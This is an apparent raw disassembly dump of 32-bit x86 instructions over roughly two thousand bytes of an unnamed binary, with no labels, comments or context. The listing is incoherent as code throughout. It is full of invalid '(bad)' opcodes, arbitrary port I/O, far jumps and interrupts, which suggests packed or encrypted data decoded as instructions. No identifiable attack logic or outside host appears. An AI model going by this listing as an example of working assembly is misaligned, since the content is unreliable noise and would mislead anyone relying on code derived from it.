  4135d3:	mov    ecx,0x91ab5474
  4135d9:	mov    eax,0x8365f071
  4135de:	sub    bl,ch
  4135e0:	jno    0x4135c1
  4135e2:	cs lahf 
  4135e4:	shr    DWORD PTR [ebx+edi*2-0x74499c4f],1
  4135eb:	mov    cl,0x9a
  4135ed:	mov    ebx,0xea86ee94
  4135f2:	jne    0x413625
  4135f4:	dec    eax
  4135f5:	ja     0x4135ad
  4135f7:	es retf 0x2bb8
  4135fb:	jo     0x413667
  4135fd:	aad    0x10
  4135ff:	cmc    
  413600:	push   ss
  413601:	enter  0x17a8,0x41
  413605:	aas    
  413606:	int    0x9c
  413608:	out    0xc9,eax
  41360a:	mov    ebx,0x673b954f
  41360f:	sub    ecx,DWORD PTR [edi-0x2abdecb4]
  413615:	push   ebx
  413616:	or     al,0x42
  413618:	std    
  413619:	fs je  0x4135bc
  41361c:	inc    edx
  41361d:	fwait
  41361e:	in     al,dx
  41361f:	add    BYTE PTR [ebp-0x7b6b0ac2],bl
  413625:	mov    ah,0x9f
  413627:	(bad)  
  413628:	mov    ds:0x168a7b7f,al
  41362d:	push   eax
  41362e:	dec    esp
  41362f:	int    0xfb
  413631:	xchg   BYTE PTR [edi],bl
  413633:	clc    
  413634:	mov    WORD PTR [esi+0xcb24873],cs
  41363a:	push   eax
  41363b:	call   0xa735d60
  413640:	mov    edx,DWORD PTR [ebp-0x1a]
  413643:	adc    dl,dl
  413645:	push   edx
  413646:	cld    
  413647:	adc    ebx,DWORD PTR [edx-0x60829178]
  41364d:	lods   al,BYTE PTR ds:[esi]
  41364e:	dec    edi
  41364f:	add    al,0xd8
  413651:	aam    0x6d
  413653:	push   edi
  413654:	loopne 0x41364a
  413656:	jle    0x4135e2
  413658:	xor    bl,BYTE PTR [ebx]
  41365a:	and    bh,BYTE PTR [eax+0x66]
  41365d:	push   ds
  41365e:	ficom  WORD PTR [ecx-0x52d206db]
  413664:	cmovs  ecx,DWORD PTR [edx-0x6e]
  413668:	(bad)  
  41366a:	jg     0x4135f5
  41366c:	es jbe 0x4136aa
  41366f:	mov    dl,0xc0
  413671:	aam    0x28
  413673:	repnz (bad) 
  413675:	gs sub esp,eax
  413678:	cwde   
  413679:	ror    BYTE PTR [ecx],0xaf
  41367c:	shl    DWORD PTR [eax],cl
  41367e:	push   cs
  41367f:	add    al,0x38
  413681:	push   ecx
  413682:	cmp    esp,DWORD PTR [edi]
  413684:	push   ss
  413685:	sbb    bl,bh
  413687:	mov    ecx,0x51c3d9ff
  41368c:	or     DWORD PTR [eax+0x2141f19e],ebx
  413692:	cmp    al,0x2c
  413694:	or     al,0x47
  413696:	icebp  
  413697:	add    edx,DWORD PTR [ebx]
  413699:	lahf   
  41369a:	loopne 0x4136d9
  41369c:	adc    esp,ebp
  41369e:	clc    
  41369f:	mov    ebp,0xa5b7e103
  4136a4:	mov    bh,0x62
  4136a6:	in     al,0xa7
  4136a8:	imul   edi,DWORD PTR [ecx-0x69b59874],0x16
  4136af:	inc    eax
  4136b0:	fisttp QWORD PTR [edi-0xb4c1314]
  4136b6:	ins    DWORD PTR es:[edi],dx
  4136b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136b8:	repz xor edx,0xffffff84
  4136bc:	cmp    DWORD PTR [esi-0x4f8be4c3],ecx
  4136c2:	ins    DWORD PTR es:[edi],dx
  4136c3:	inc    edx
  4136c4:	dec    ebx
  4136c5:	pop    ebp
  4136c6:	xor    DWORD PTR [ebx],eax
  4136c8:	and    BYTE PTR [edx-0x376f1daf],al
  4136ce:	xor    DWORD PTR [edi-0x4dda209d],0xffffffea
  4136d5:	loope  0x413662
  4136d7:	xor    ah,BYTE PTR [eax+edi*8]
  4136da:	or     cl,BYTE PTR [edi]
  4136dc:	ins    BYTE PTR es:[edi],dx
  4136dd:	stc    
  4136de:	sub    BYTE PTR [edx],dl
  4136e0:	and    al,0xa8
  4136e2:	xor    eax,0xa41d0bf8
  4136e7:	hlt    
  4136e8:	jmp    0x4136b5
  4136ea:	ins    DWORD PTR es:[edi],dx
  4136eb:	pushf  
  4136ec:	aad    0x36
  4136ee:	xor    edx,DWORD PTR [edi+0x47687109]
  4136f4:	xor    DWORD PTR [edx+0x3c],ecx
  4136f7:	mov    esi,0xc874ac3c
  4136fc:	cli    
  4136fd:	add    BYTE PTR [edi+eiz*2-0x4f],ch
  413701:	cmp    BYTE PTR [ebp+0x5c],al
  413704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413705:	pop    ebx
  413706:	mov    BYTE PTR [edx-0x1952b2b],bh
  41370c:	stos   DWORD PTR es:[edi],eax
  41370d:	jl     0x41376b
  41370f:	xchg   ebx,eax
  413710:	(bad)  
  413711:	jg     0x413752
  413713:	rcl    BYTE PTR [edx-0x4c4a3523],0x20
  41371a:	adc    BYTE PTR [edx+0x6f],cl
  41371d:	shr    DWORD PTR [eax+0x7e],cl
  413720:	add    esp,DWORD PTR [esi+ebx*1]
  413723:	xor    BYTE PTR [esi+0x55],bl
  413726:	mov    ds:0xdb8a417b,eax
  41372b:	stos   BYTE PTR es:[edi],al
  41372c:	and    ecx,DWORD PTR [eax+0x4bf5bd0]
  413732:	int3   
  413733:	push   0x198d0bf9
  413738:	or     cl,dh
  41373a:	add    eax,0x1fabcb82
  41373f:	mov    DWORD PTR [eax],ebx
  413741:	sbb    bh,BYTE PTR [esi+0x55]
  413744:	cld    
  413745:	add    eax,0x8c95e16f
  41374a:	pop    edi
  41374b:	push   esi
  41374c:	pop    ebp
  41374d:	add    al,0x6d
  41374f:	push   0x87ee972b
  413754:	add    bh,BYTE PTR [ecx+0x4cebc532]
  41375a:	lea    edi,[ebx+0x18]
  41375d:	outs   dx,DWORD PTR ds:[esi]
  41375e:	mov    ecx,0xc4c36c11
  413763:	sub    bl,BYTE PTR [ebx+0x2cc1fc84]
  413769:	sbb    ebx,DWORD PTR [ecx]
  41376b:	(bad)  
  41376c:	aad    0xc8
  41376e:	and    ebp,DWORD PTR [edi+0x73]
  413771:	or     DWORD PTR [esi+0x5de83d35],esi
  413777:	js     0x4137d6
  413779:	std    
  41377a:	sub    BYTE PTR [eax+0x33],bl
  41377d:	test   al,0xd8
  41377f:	leave  
  413780:	mov    dl,0xe9
  413782:	mov    BYTE PTR [eax-0x6a69d20e],ah
  413788:	(bad)  
  413789:	(bad)  
  41378a:	push   ds
  41378b:	and    esi,ebx
  41378d:	sub    ch,BYTE PTR [edx+0x4c]
  413790:	cmp    eax,esp
  413792:	mov    ds:0xd550ccaa,eax
  413797:	sbb    bh,BYTE PTR [edi+esi*8]
  41379a:	and    al,dh
  41379c:	push   ds
  41379d:	xchg   edi,eax
  41379e:	fst    DWORD PTR [esi-0x78]
  4137a1:	sbb    BYTE PTR [eax+0x401c439b],ch
  4137a7:	cli    
  4137a8:	xor    eax,0xd5312b10
  4137ad:	pop    esi
  4137ae:	push   edi
  4137af:	and    al,0xb7
  4137b1:	inc    esi
  4137b2:	ins    BYTE PTR es:[edi],dx
  4137b3:	retf   0x6056
  4137b6:	add    ecx,eax
  4137b8:	pop    esp
  4137b9:	adc    al,0x54
  4137bb:	icebp  
  4137bc:	jl     0x4137cd
  4137be:	or     DWORD PTR ds:0xa9216c84,ebp
  4137c4:	fst    QWORD PTR [ebp-0x598ba888]
  4137ca:	adc    DWORD PTR [edx+0x45],ebx
  4137cd:	fsubr  st(3),st
  4137cf:	push   edx
  4137d0:	xchg   esi,eax
  4137d1:	ror    BYTE PTR [esi-0x5],cl
  4137d4:	push   es
  4137d5:	(bad)  
  4137d6:	(bad)  
  4137d8:	mov    es,ecx
  4137da:	dec    ebp
  4137db:	xchg   edx,eax
  4137dc:	sub    BYTE PTR [esi],0x75
  4137df:	retf   
  4137e0:	dec    ebp
  4137e1:	scas   al,BYTE PTR es:[edi]
  4137e2:	fld    QWORD PTR ds:0x47c2e39d
  4137e8:	in     eax,dx
  4137e9:	xor    eax,0x70c2e222
  4137ee:	nop
  4137ef:	add    ebp,DWORD PTR [ebx]
  4137f1:	or     eax,0x155d26da
  4137f6:	out    dx,al
  4137f7:	mov    edx,ss
  4137f9:	mov    esi,0x5546899d
  4137ff:	mov    edi,0x29a782bc
  413804:	jge    0x4137bb
  413806:	adc    dh,al
  413808:	mov    bh,0x75
  41380a:	sub    eax,0xc722a636
  41380f:	int    0x95
  413811:	jmp    0x879b:0x54107474
  413818:	aad    0xf9
  41381a:	iret   
  41381b:	(bad)  [edi+eiz*2-0x41]
  41381f:	jecxz  0x413841
  413821:	ret    
  413822:	add    al,0x7
  413824:	rcr    ch,1
  413826:	xchg   esp,eax
  413827:	outs   dx,DWORD PTR ds:[esi]
  413828:	popa   
  413829:	and    dh,ch
  41382b:	js     0x41383f
  41382d:	fistp  DWORD PTR [edi-0x47]
  413830:	fisttp QWORD PTR [edx+0x26]
  413833:	add    edi,ebp
  413835:	gs out 0x86,eax
  413838:	popa   
  413839:	jae    0x4137f4
  41383b:	call   0xb348:0x593bb213
  413842:	pop    ss
  413843:	add    eax,0x1a9d311e
  413848:	out    0xa8,eax
  41384a:	inc    ebx
  41384b:	push   es
  41384c:	mov    bl,0x2b
  41384e:	adc    dh,0x2e
  413851:	or     dl,BYTE PTR [eax+0x57e5f0d5]
  413857:	pop    es
  413858:	setp   BYTE PTR [ebx+0x3398d599]
  41385f:	and    ebp,eax
  413861:	jo     0x41385b
  413863:	loop   0x4138ad
  413865:	dec    edi
  413866:	push   ds
  413867:	out    dx,eax
  413868:	jle    0x4137ff
  41386a:	jecxz  0x413879
  41386c:	inc    ebx
  41386d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41386e:	fmulp  st(2),st
  413870:	je     0x41381d
  413872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413873:	pop    es
  413874:	cld    
  413875:	pop    edx
  413876:	add    eax,ebx
  413878:	arpl   WORD PTR [eax],ax
  41387a:	fnstsw WORD PTR [ebx-0x50]
  41387d:	test   al,dh
  41387f:	mov    eax,0xd94e56c2
  413884:	fild   QWORD PTR [ecx]
  413886:	into   
  413887:	fsub   DWORD PTR [edi+0x2b]
  41388a:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41388c:	jmp    0x4138e3
  41388e:	inc    edi
  41388f:	iret   
  413890:	bound  edx,QWORD PTR [edx+0x75]
  413893:	sub    esi,esi
  413895:	test   BYTE PTR [ecx+0x51eec991],0x1
  41389c:	lock xor al,0x4d
  41389f:	addr16 mov ebx,0xfda7d804
  4138a5:	inc    edi
  4138a6:	push   edx
  4138a7:	xor    eax,0x32c7c470
  4138ac:	in     al,dx
  4138ad:	add    al,0x59
  4138af:	pusha  
  4138b0:	sbb    bl,cl
  4138b2:	jl     0x4138af
  4138b4:	cmp    edx,DWORD PTR [ecx+0x66c9a021]
  4138ba:	jno    0x413912
  4138bc:	imul   ebp,DWORD PTR [ebp-0x36],0xffffffe9
  4138c0:	imul   ecx,DWORD PTR [esp+ebx*4-0x752ba38b],0xefc8bdb0
  4138cb:	add    ecx,DWORD PTR [edx+edi*8+0x25]
  4138cf:	pop    esi
  4138d0:	pop    ebp
  4138d1:	xor    BYTE PTR [edi+0x61],0xef
  4138d5:	xor    ebx,DWORD PTR [edx-0x80]
  4138d8:	sar    DWORD PTR [ecx+0x6e],0xfc
  4138dc:	into   
  4138dd:	test   ebp,eax
  4138df:	cmp    DWORD PTR [eax-0x29db3133],0xffffffb2
  4138e6:	cdq    
  4138e7:	psrlw  mm5,QWORD PTR [edi+0x4e]
  4138eb:	je     0x41391e
  4138ed:	ins    DWORD PTR es:[edi],dx
  4138ee:	add    DWORD PTR [esi-0x28cd43f1],eax
  4138f4:	(bad)  [edi+0x746ed9cd]
  4138fa:	xchg   esi,eax
  4138fb:	pop    es
  4138fc:	dec    eax
  4138fd:	imul   edx,DWORD PTR [edx],0xffffff9a
  413900:	sbb    dl,BYTE PTR [ebx+0x3a0eb5d9]
  413906:	and    eax,0x87f50de
  41390b:	xlat   BYTE PTR ds:[ebx]
  41390c:	pop    es
  41390d:	ja     0x413898
  41390f:	sub    BYTE PTR [ebp+edi*2+0x20],ah
  413913:	enter  0xae7a,0x64
  413917:	mov    ch,0x44
  413919:	pop    bp
  41391b:	or     al,0xb9
  41391d:	es mov dh,0x54
  413920:	ins    BYTE PTR es:[edi],dx
  413921:	jg     0x413965
  413923:	mov    ch,ah
  413925:	std    
  413926:	out    dx,al
  413927:	nop
  413928:	xchg   ebp,eax
  413929:	mov    edi,0x27fb9ec6
  41392e:	mov    BYTE PTR [edi-0x66],bh
  413931:	adc    DWORD PTR [ebx-0x52ba259a],ebp
  413937:	jge    0x4138ba
  413939:	and    dh,BYTE PTR [ebp-0x56]
  41393c:	(bad)  
  41393d:	arpl   si,di
  41393f:	scas   eax,DWORD PTR es:[edi]
  413940:	xor    ah,0xc3
  413943:	sbb    DWORD PTR [ecx],ebx
  413945:	mov    BYTE PTR [ebp-0x35cb81b9],dl
  41394b:	inc    ebx
  41394c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41394d:	es inc esi
  41394f:	push   es
  413950:	cmp    al,0x9b
  413952:	pusha  
  413953:	xor    ch,BYTE PTR [edx-0x69432152]
  413959:	mov    bh,ah
  41395b:	ins    BYTE PTR es:[edi],dx
  41395c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41395d:	or     DWORD PTR [edx],edi
  41395f:	mov    esp,0x18a871ae
  413964:	shl    BYTE PTR [edx-0x8],0x7f
  413968:	ss inc edi
  41396a:	gs pop ss
  41396c:	cmp    al,0x94
  41396e:	cmp    cl,ch
  413970:	in     eax,0xa7
  413972:	add    ecx,DWORD PTR [ebp+eiz*8+0x1d149195]
  413979:	pop    ecx
  41397a:	fwait
  41397b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41397c:	out    dx,al
  41397d:	dec    si
  41397f:	fdivr  DWORD PTR [eax]
  413981:	mov    esp,0xe4e19c0f
  413986:	sub    ebp,DWORD PTR [ecx]
  413988:	mov    cs,WORD PTR [esp+ecx*8+0x39]
  41398c:	shr    dh,1
  41398e:	add    DWORD PTR [esi+0x4bfaa6fb],ebx
  413994:	lds    edx,FWORD PTR [ebx]
  413996:	xchg   edi,eax
  413997:	(bad)  
  413999:	and    eax,0x72ff1ff2
  41399e:	or     DWORD PTR [esi],0xcca0b41a
  4139a4:	xchg   edi,eax
  4139a5:	mov    bl,0x4e
  4139a7:	jmp    0x124:0xf0e10355
  4139ae:	ret    
  4139af:	mov    dl,0x51
  4139b2:	and    eax,0x880e0597
  4139b7:	pop    esi
  4139b8:	aad    0xc3
  4139ba:	je     0x4139e2
  4139bc:	cmp    bl,BYTE PTR [edi+0x1d1e9f2a]
  4139c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139c3:	jbe    0x41394b
  4139c5:	push   cs
  4139c6:	div    DWORD PTR [ebx]
  4139c8:	mov    ds:0x8c9ace0a,eax
  4139cd:	xsaveopt [di-0x67e0]
  4139d3:	ror    BYTE PTR [eax-0x14464849],1
  4139d9:	shl    BYTE PTR [esi-0x2dfa6b4c],cl
  4139df:	mov    ebp,0x499fa851
  4139e4:	scas   al,BYTE PTR es:[edi]
  4139e5:	pop    edx
  4139e6:	shr    BYTE PTR [eax-0x5f],cl
  4139e9:	dec    ebx
  4139ea:	pushf  
  4139eb:	mov    eax,ds:0xdc40d75
  4139f0:	icebp  
  4139f1:	jns    0x4139ab
  4139f3:	(bad)  
  4139f4:	dec    ebp
  4139f5:	aam    0x1b
  4139f7:	mov    eax,ds:0x58f43346
  4139fc:	repz iret 
  4139fe:	xchg   ecx,eax
  4139ff:	(bad)  
  413a00:	shl    BYTE PTR [ebp-0x57],1
  413a03:	or     ecx,0xbd89a0fc
  413a09:	xor    eax,0x5cf55d8a
  413a0e:	push   0xf270dec8
  413a13:	ss dec esi
  413a15:	rcl    DWORD PTR [ebx+0x6e462008],0x18
  413a1c:	in     eax,dx
  413a1d:	mov    bh,0xf
  413a1f:	out    dx,eax
  413a20:	jnp    0x413a29
  413a22:	adc    DWORD PTR [edx-0x60562a2a],eax
  413a28:	stc    
  413a29:	inc    ecx
  413a2a:	dec    esp
  413a2b:	call   FWORD PTR [bp+di+0x14]
  413a2f:	cmp    bl,BYTE PTR [ecx]
  413a31:	mov    es,edi
  413a33:	jb     0x4139de
  413a35:	div    BYTE PTR [edi]
  413a37:	push   eax
  413a38:	hlt    
  413a39:	shl    DWORD PTR [ecx-0x7f],cl
  413a3c:	(bad)  
  413a3d:	arpl   WORD PTR [edx],sp
  413a3f:	cmp    eax,0xe3e597c3
  413a44:	clc    
  413a45:	retf   0x4829
  413a48:	outs   dx,BYTE PTR ds:[esi]
  413a49:	out    dx,al
  413a4a:	fsubp  st(2),st
  413a4c:	mov    ?,WORD PTR [eax]
  413a4e:	jle    0x413a3d
  413a50:	int    0xba
  413a52:	mov    edi,0x39fb1064
  413a57:	in     eax,dx
  413a58:	dec    ebp
  413a59:	cmp    edi,ecx
  413a5b:	mov    ebx,0xcdceaf3d
  413a60:	or     al,0x27
  413a62:	cmp    eax,0x6d58fe5
  413a67:	int3   
  413a68:	dec    ebp
  413a69:	ja     0x413a41
  413a6b:	xor    cl,ch
  413a6d:	pop    ds
  413a6e:	out    0x1f,al
  413a70:	sub    DWORD PTR [bx+di],edx
  413a73:	jo     0x4139fd
  413a75:	push   cs
  413a76:	cs push edx
  413a78:	out    dx,eax
  413a79:	and    eax,0xec98bdb9
  413a7e:	xor    eax,0x6370727b
  413a83:	pop    esi
  413a84:	xchg   esi,eax
  413a85:	mov    dh,0x1e
  413a87:	inc    eax
  413a88:	push   esi
  413a89:	mov    dh,0x46
  413a8b:	popa   
  413a8c:	xor    cl,BYTE PTR ds:0xb4f3a908
  413a92:	mov    cl,0x3f
  413a94:	stos   BYTE PTR es:[edi],al
  413a95:	es in  al,0x51
  413a98:	jno    0x413a27
  413a9a:	push   ds
  413a9b:	call   0xc7896769
  413aa0:	push   edx
  413aa1:	fld    st(1)
  413aa3:	fadd   QWORD PTR [ecx-0x72bd3731]
  413aa9:	rcr    BYTE PTR [edx],1
  413aab:	clc    
  413aac:	push   esi
  413aad:	daa    
  413aae:	loop   0x413afb
  413ab0:	mov    bh,0xb1
  413ab2:	out    0x16,al
  413ab4:	lds    ebp,FWORD PTR [edi+0x4]
  413ab7:	or     BYTE PTR cs:[ebp+eiz*2-0x4ffabef2],bl
  413abf:	sar    DWORD PTR [esi-0x726009b8],cl
  413ac5:	sbb    BYTE PTR [esi+0x4e84e928],0xe4
  413acc:	xchg   esp,eax
  413acd:	jno    0x413b07
  413acf:	ss cld 
  413ad1:	and    DWORD PTR [ebp-0x7b98d7f8],ebx
  413ad7:	add    dl,BYTE PTR [esi-0x24]
  413ada:	xlat   BYTE PTR ds:[ebx]
  413adb:	mov    esi,0x1f916e62
  413ae0:	rcr    DWORD PTR [ebp+esi*8+0x56f1dd3a],0x1a
  413ae8:	addr16 jns 0x413aa1
  413aeb:	repnz mov edx,0x87265aaa
  413af1:	ret    
  413af2:	enter  0xe424,0x1f
  413af6:	pop    edx
  413af7:	aam    0x4
  413af9:	mov    esi,0xf4fe3ca7
  413afe:	fucomip st,st(3)
  413b00:	mov    DWORD PTR [edx+0x60755589],ebp
  413b06:	pop    ebx
  413b07:	or     al,0x19
  413b09:	mov    ah,0xa4
  413b0b:	in     al,0xeb
  413b0d:	mov    edi,0xee8e0475
  413b12:	push   ebx
  413b13:	sub    eax,0x8345beea
  413b18:	loop   0x413aa4
  413b1a:	cwde   
  413b1b:	pop    edi
  413b1c:	adc    al,0x0
  413b1e:	cs enter 0x4724,0xef
  413b23:	gs popa 
  413b25:	mov    eax,ds:0x2b2ad64d
  413b2a:	pusha  
  413b2b:	stc    
  413b2c:	dec    edx
  413b2d:	fstp   QWORD PTR ds:0x6a277a58
  413b33:	cmp    DWORD PTR [ebx-0x716ebac2],ebx
  413b39:	sub    cl,BYTE PTR [ebx]
  413b3b:	out    0x3f,al
  413b3d:	das    
  413b3e:	jmp    0x1171:0x655b1007
  413b45:	xor    dl,bh
  413b47:	(bad)  
  413b48:	mov    esp,0xe17d718d
  413b4d:	mov    ebp,0x7ff6d9f4
  413b52:	push   esp
  413b53:	dec    edx
  413b54:	dec    ebx
  413b55:	ret    0xfee
  413b58:	test   BYTE PTR [edi-0x44],ah
  413b5b:	adc    esi,ebx
  413b5d:	xchg   BYTE PTR [edi],dl
  413b5f:	mov    eax,0x781506c7
  413b64:	les    ecx,FWORD PTR [edi]
  413b66:	xor    esi,DWORD PTR [eax]
  413b68:	cdq    
  413b69:	out    0xed,al
  413b6b:	addr16 retf 0x1118
  413b6f:	jnp    0x413b2d
  413b71:	sbb    esp,esp
  413b73:	test   eax,0x372060a3
  413b78:	loop   0x413bc1
  413b7a:	xabort 0xd
  413b7d:	jo     0x413bb8
  413b7f:	sub    DWORD PTR [edx],ecx
  413b81:	push   ds
  413b82:	fnstenv [eax]
  413b84:	into   
  413b85:	es adc al,0x67
  413b88:	loopne 0x413bb6
  413b8a:	in     al,dx
  413b8b:	dec    esi
  413b8c:	pushf  
  413b8d:	push   esp
  413b8e:	lods   eax,DWORD PTR ds:[esi]
  413b8f:	ror    edi,cl
  413b91:	sub    al,0xdb
  413b93:	loope  0x413b4a
  413b95:	aaa    
  413b96:	or     al,0xaf
  413b98:	cld    
  413b99:	mov    eax,ds:0x41f6dcb3
  413b9e:	mov    cl,BYTE PTR [edx]
  413ba0:	mov    ebx,0x9ee34f03
  413ba5:	outs   dx,DWORD PTR ds:[esi]
  413ba6:	test   eax,0xc4a72929
  413bab:	aad    0x91
  413bad:	mov    edx,0xa6ecb316
  413bb2:	push   esp
  413bb3:	in     al,dx
  413bb4:	aaa    
  413bb5:	scas   al,BYTE PTR es:[edi]
  413bb6:	mul    dh
  413bb8:	rcr    eax,cl
  413bba:	adc    dl,BYTE PTR [edi]
  413bbc:	imul   ebp,DWORD PTR [edi+ebp*8+0x5ac07f59],0xfffffff5
  413bc4:	fsub   DWORD PTR [ebx-0x66]
  413bc7:	leave  
  413bc8:	jp     0x413b74
  413bca:	sbb    eax,0x1711b02
  413bcf:	in     al,0xe
  413bd1:	in     al,0xcd
  413bd3:	cmp    esi,DWORD PTR [ebp+0x194a602d]
  413bd9:	jmp    0x8efcc21
  413bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bdf:	inc    ecx
  413be0:	xor    ebp,DWORD PTR [ebx-0x7]
  413be3:	retf   
  413be4:	add    DWORD PTR [eax+0x8],ecx
  413be7:	xor    ebp,ebp
  413be9:	aam    0x59
  413beb:	cmp    eax,0xf4704a58
  413bf0:	les    ebp,FWORD PTR [eax-0x73]
  413bf3:	add    eax,0xd6da67da
  413bf8:	gs test eax,0x94f028a5
  413bfe:	push   ebx
  413bff:	shl    DWORD PTR [edi],cl
  413c01:	in     al,dx
  413c02:	inc    ebx
  413c03:	test   eax,0x218c47ce
  413c08:	jnp    0x413c07
  413c0a:	retf   
  413c0b:	popa   
  413c0c:	in     eax,dx
  413c0d:	(bad)  
  413c0e:	lods   al,BYTE PTR ds:[esi]
  413c0f:	out    dx,al
  413c10:	or     BYTE PTR [ecx],dl
  413c12:	cmc    
  413c13:	dec    ebp
  413c14:	adc    ebx,DWORD PTR [edi-0x21f11643]
  413c1a:	into   
  413c1b:	jbe    0x413c5d
  413c1d:	(bad)  
  413c1e:	sti    
  413c1f:	fmul   DWORD PTR [ebx]
  413c21:	sub    al,0xc
  413c23:	or     DWORD PTR [edi-0x37],edi
  413c26:	jmp    0x413c38
  413c28:	sub    edx,DWORD PTR [edi]
  413c2a:	retf   
  413c2b:	outs   dx,DWORD PTR ds:[esi]
  413c2c:	outs   dx,BYTE PTR ds:[esi]
  413c2d:	xchg   esp,eax
  413c2e:	mov    edx,0x2af4d24b
  413c33:	mov    al,ds:0xe213fc65
  413c38:	lss    edx,FWORD PTR [esi+0x26]
  413c3c:	out    dx,al
  413c3d:	and    eax,0x1eba4ad7
  413c42:	mov    dl,0xd1
  413c44:	add    dh,BYTE PTR [eax-0x5e01f156]
  413c4a:	mov    edi,0x71d32731
  413c4f:	lahf   
  413c50:	leave  
  413c51:	mov    esi,0x5cdfbe5c
  413c56:	in     eax,dx
  413c57:	jmp    0x413c0e
  413c59:	outs   dx,BYTE PTR ds:[esi]
  413c5a:	das    
  413c5b:	lock jecxz 0x413be3
  413c5e:	mov    ebp,0x7b01f3e8
  413c63:	aad    0xb4
  413c65:	out    dx,al
  413c66:	ret    
  413c67:	xchg   ebx,eax
  413c68:	sub    DWORD PTR [ebp+0x78061577],0xffffffe5
  413c6f:	mov    esi,0x4b699ba4
  413c74:	and    esp,DWORD PTR [edx-0x45]
  413c77:	shl    BYTE PTR [ecx-0x75a574a7],cl
  413c7d:	addr16 lock xchg edi,eax
  413c80:	mov    ecx,ds
  413c82:	jmp    DWORD PTR [ebp-0x539a7239]
  413c88:	xchg   esp,eax
  413c89:	adc    al,0x5c
  413c8b:	dec    edx
  413c8c:	xlat   BYTE PTR ds:[ebx]
  413c8d:	xchg   ecx,eax
  413c8e:	addr16 xchg edi,eax
  413c90:	jbe    0x413c6e
  413c92:	ja     0x413cd7
  413c94:	xor    DWORD PTR [ebp+0x65694ddb],edi
  413c9a:	hlt    
  413c9b:	ror    BYTE PTR [ebx+0x66],0xc3
  413c9f:	push   0xfffffff5
  413ca1:	cmp    DWORD PTR [eax+ecx*4-0x6c],ebx
  413ca5:	cmp    BYTE PTR [ecx],dl
  413ca7:	out    0x22,al
  413ca9:	in     al,0xf7
  413cab:	cmp    DWORD PTR fs:[ebp+esi*2+0x1a],ecx
  413cb0:	xchg   esi,eax
  413cb1:	mov    eax,ds:0xdf85f437
  413cb6:	(bad)  
  413cb7:	lods   al,BYTE PTR ds:[esi]
  413cb8:	fstp   QWORD PTR [ebx]
  413cba:	xor    DWORD PTR [edi-0x65],0x39
  413cbe:	sub    dl,BYTE PTR [ebx]
  413cc0:	cmp    DWORD PTR [edi+0x66],ebx
  413cc3:	push   cs
  413cc4:	mov    eax,0xf18adbbc
  413cc9:	mov    WORD PTR [esi-0x57],fs
  413ccc:	xchg   ah,al
  413cce:	out    dx,al
  413ccf:	jbe    0x413cf7
  413cd1:	(bad)
  413cd4:	dec    ecx
  413cd5:	pop    ds
  413cd6:	pop    ss
  413cd7:	in     al,0x6a
  413cd9:	cwde   
  413cda:	fist   DWORD PTR [edx+0x69]
  413cdd:	mov    DWORD PTR [ebx+0x3b],edi
  413ce0:	xor    eax,0x861bef75
  413ce5:	out    0x23,al
  413ce7:	or     al,0x9
  413ce9:	fwait
  413cea:	sub    al,0x62
  413cec:	stc    
  413ced:	push   eax
  413cee:	cmp    DWORD PTR [esi+0x6daa8a6],esi
  413cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cf5:	jae    0x413d43
  413cf7:	dec    esp
  413cf8:	popa   
  413cf9:	pop    ds
  413cfa:	leave  
  413cfb:	add    eax,0xeaf4ae4
  413d00:	retf   0xff47
  413d03:	out    dx,eax
  413d04:	xor    WORD PTR [esi+0x39975b34],bx
  413d0b:	sub    al,0x33
  413d0d:	mov    eax,ds:0x6376cb41
  413d12:	sub    eax,0xaf98ac8a
  413d17:	(bad)  
  413d19:	ja     0x413d85
  413d1b:	add    eax,0x17b03af2
  413d20:	and    BYTE PTR [eax+0x2447b4fb],dl
  413d26:	fsubrp st(7),st
  413d28:	sub    DWORD PTR [ebx],edx
  413d2a:	mov    eax,0x20d08c9b
  413d2f:	xchg   ebp,eax
  413d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d31:	sub    al,0xf9
  413d33:	pop    esi
  413d34:	adc    ecx,DWORD PTR ds:0x75dcfc46
  413d3a:	ins    DWORD PTR es:[edi],dx
  413d3b:	sbb    esp,DWORD PTR [ecx]
  413d3d:	test   eax,0x6c218502
  413d42:	inc    edi
  413d43:	loopne 0x413d05
  413d45:	cli    
  413d46:	int    0xb8
  413d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d49:	mov    eax,0x17ab8cbc
  413d4e:	mov    eax,DWORD PTR [edi+0x28]
  413d51:	and    eax,0xfd4c8c55
  413d56:	pop    eax
  413d57:	outs   dx,BYTE PTR ds:[esi]
  413d58:	pop    ebp
  413d59:	inc    esi
  413d5a:	loope  0x413dcb
  413d5c:	add    eax,0x9df984e9
  413d61:	adc    ch,BYTE PTR [ebx+eiz*8]
  413d64:	inc    ebp
  413d65:	fsubr  st,st(0)
  413d67:	arpl   WORD PTR [esi-0x2f],bx
  413d6a:	mov    fs,WORD PTR [ebx-0x26]
  413d6d:	jo     0x413d4d
  413d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d70:	or     BYTE PTR [eax-0x358ea620],ah
  413d76:	dec    edi
  413d77:	adc    eax,0x20e1e2c
  413d7c:	imul   ebp,DWORD PTR [ecx],0x4d
  413d7f:	ja     0x413d36
  413d81:	ror    DWORD PTR [edi-0x29],cl
  413d84:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  413d86:	sub    BYTE PTR [edx+0x7dccef9b],dh
  413d8c:	adc    ecx,0x4d
  413d8f:	add    DWORD PTR [edi-0x6c4eb5a6],ebx
  413d95:	or     BYTE PTR [ebx-0x28],dh
  413d98:	jno    0x413dc8
  413d9a:	mov    esi,0x9ea8405b
  413d9f:	mov    BYTE PTR [ecx-0x7b],ch
  413da2:	mov    dh,BYTE PTR [eax+0x39]
  413da5:	push   ds
  413da6:	mov    bh,0x42
  413da8:	jbe    0x413e1e
  413daa:	add    DWORD PTR [ebx-0x647f633f],edx
